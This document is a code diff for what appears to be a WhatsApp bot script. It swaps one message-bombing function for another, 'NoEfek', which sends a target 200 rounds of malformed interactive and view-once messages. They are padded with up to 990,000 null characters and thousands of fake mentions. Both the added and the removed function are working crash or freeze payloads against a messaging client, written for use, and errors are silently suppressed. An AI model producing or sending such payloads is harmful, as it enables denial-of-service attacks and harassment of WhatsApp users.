@@ -1,60 +1,75 @@
-async function PaymentOneMsgX7(sock, jid) {
-  for (var r = 0; r < 100; r++) {
+async function NoEfek(sock, jid) {
+  for (let i = 0; i < 200; i++) {
+  const msg = {
+    interactiveResponseMessage: {
+      header: {
+        title: "Calm ~ Rans" + "\u0000".repeat(9999) 
+      },
+      body: {
+        text: "RanzX7", 
+        formar: "EXTENSION_1"
+      },
+      nativeFlowResponseMessage: {
+        name: "review_and_pay",
+        paramsJson: "\u0000".repeat(2000)
+      },
+      version: 3,
+      entryPointConversionSource: "payment_method"
+    }, 
+    quotedMessage: {
+        viewOnceMessage: {
+           message: {
+              interactiveResponseMessage: {
+                body: {
+                  text: "𝖷𝟩Rans",
+                  format: "EXTENSION_1" 
+                },
+                nativeFlowResponseMessage: {
+                  name: "call_permission_request",
+                  paramsJson: "\u0007".repeat(90000),
+                  version: 3
+                  }
+              }
+           }
+        }
+    }
+  };
 
-    let msg = generateWAMessageFromContent(
-      target,
-      {
-        viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              body: {
-                text: "X7 | AsepExplost"
-              },
+  const RX7Msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          contextInfo: {
+            participant: jid,
+            mentionedJid: [
+              '0@s.whatsapp.net',
+              ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
+            ],
+            body: {
+              text: 'RansX7',
+              format: 'EXTENSION_1'
+            },
+            footer: {
+              text: '\u0000'.repeat(25000),
+              format: 'EXTENSION_1'
+            },
+            nativeFlowResponseMessage: {
+              name: 'address_message',
+              paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(990000)}}}`,
+              version: 3
+            }
+          }
+        }
+      }
+    }
+  };
 
-              nativeFlowMessage: {
-                messageParamsJson: "\0".repeat(10000),
 
-                buttons: [
-                  {
-                    name: "payment_method",
-
-                    buttonParamsJson:
-                      "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
-                  }
-                ],
-
-                messageParamsJson: "\0".repeat(10000)
-              },
-
-              contextInfo: {
-                quotedMessage: {
-                  paymentInviteMessage: {
-                    serviceType: 2,
-                    expiryTimestamp:
-                      Math.floor(Date.now() / 1000) + 86400
-                  }
-                }
-              }
-            }
-          }
-        }
-      },
-      {}
-    );
-
-    await sock.relayMessage(
-      jid,
-      msg.message,
-      {
-        messageId: msg.key.id,
-        participant: { jid: jid }
-      }
-    );
-
-    await sleep(1000);
-  }
+    await sock.relayMessage(jid, msg, {}).catch(() => {});
+    await sock.relayMessage(jid, RX7Msg, { participant: { jid: jid } }).catch(() => {});
+  }
 }
 
 try {
-  await PaymentOneMsgX7(sock, jid);
+  await NoEfek(sock, jid);
 } catch {}
